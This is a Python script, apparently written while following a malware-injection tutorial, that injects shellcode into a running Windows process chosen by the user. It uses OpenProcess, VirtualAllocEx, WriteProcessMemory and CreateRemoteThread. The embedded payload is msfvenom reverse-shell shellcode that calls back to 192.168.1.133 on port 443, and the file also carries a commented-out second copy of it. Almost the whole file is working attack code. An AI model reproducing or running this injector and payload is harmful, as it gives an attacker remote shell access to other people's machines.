# 13.2.2023 - By BMT
# https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html

# Used API 
# - VirtualAllocEx
# - WriteProcessMemory
# - CreateRemoteThread
# - OpenProcess


import ctypes
from ctypes.wintypes import DWORD


# msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.133 lport=443 -f python
shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
shellcode += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
shellcode += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
shellcode += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
shellcode += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
shellcode += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
shellcode += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
shellcode += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
shellcode += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
shellcode += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
shellcode += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
shellcode += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
shellcode += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
shellcode += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
shellcode += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
shellcode += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
shellcode += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
shellcode += b"\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x01\x85\x41\x54"
shellcode += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
shellcode += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
shellcode += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
shellcode += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
shellcode += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
shellcode += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
shellcode += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
shellcode += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
shellcode += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
shellcode += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
shellcode += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
shellcode += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
shellcode += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
shellcode += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
shellcode += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
shellcode += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
shellcode += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
shellcode += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
shellcode += b"\x89\xda\xff\xd5"


# shellcode =  b""
# shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
# shellcode += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
# shellcode += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
# shellcode += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
# shellcode += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
# shellcode += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
# shellcode += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
# shellcode += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
# shellcode += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
# shellcode += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
# shellcode += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
# shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
# shellcode += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
# shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
# shellcode += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
# shellcode += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
# shellcode += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
# shellcode += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
# shellcode += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
# shellcode += b"\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x01\x85\x41\x54"
# shellcode += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
# shellcode += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
# shellcode += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
# shellcode += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
# shellcode += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
# shellcode += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
# shellcode += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
# shellcode += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
# shellcode += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
# shellcode += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
# shellcode += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
# shellcode += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
# shellcode += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
# shellcode += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
# shellcode += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
# shellcode += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
# shellcode += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
# shellcode += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
# shellcode += b"\x89\xda\xff\xd5"



# convert to the c style string shellcodefer object
# shellcode = ctypes.create_string_shellcodefer(shellcode)
length = len(shellcode)
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READ_EXECUTE = 0x20
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFFF)

k_handle = ctypes.WinDLL("Kernel32.dll")

process_id = int(input("Enter the Process ID: "))



process_handle = k_handle.OpenProcess(PROCESS_ALL_ACCESS, False, DWORD(process_id))
if process_handle == 0:
    print("[ERROR] Cannot Grab Process Handle")
else:
    print("[INFO] Successfully Grab the Process Handle!...")
    


k_handle.VirtualAllocEx.restype = ctypes.c_void_p #set the return type
allocate_memory = k_handle.VirtualAllocEx(process_handle, 0, length, (MEM_COMMIT | MEM_RESERVE), PAGE_READ_EXECUTE)
if allocate_memory == 0:
    print("[ERROR] Cannot Allocate The Memory")
else:
    print("[INFO] Successfully Allocate!...")
    


write_memory = k_handle.WriteProcessMemory(process_handle, ctypes.c_void_p(allocate_memory), shellcode, length, None) 
# the sencond permeter type cast as c_void_p because of the return type in line 79
# according to the official doc, the second parameter must be "LPVOID" data type which is "c_void_p" in ctypes docs in references section
if write_memory == 0:
    print("[ERROR] Cannot Write On The Memory")
else:
    print("[INFO] Successfully Write...")



remote_thread = k_handle.CreateRemoteThread(process_handle, None, 0, ctypes.c_void_p(allocate_memory), None, 0, None)
if remote_thread == 0:
    print("[ERROR] Cannot Start the New Process")
else:
    print("[INFO] Successfully Create New Process...")


# References: 
# https://github.com/python/cpython/blob/main/Lib/ctypes/wintypes.py#:~:text=LPCVOID%20%3D%20LPVOID%20%3D%20ctypes.c_void_p //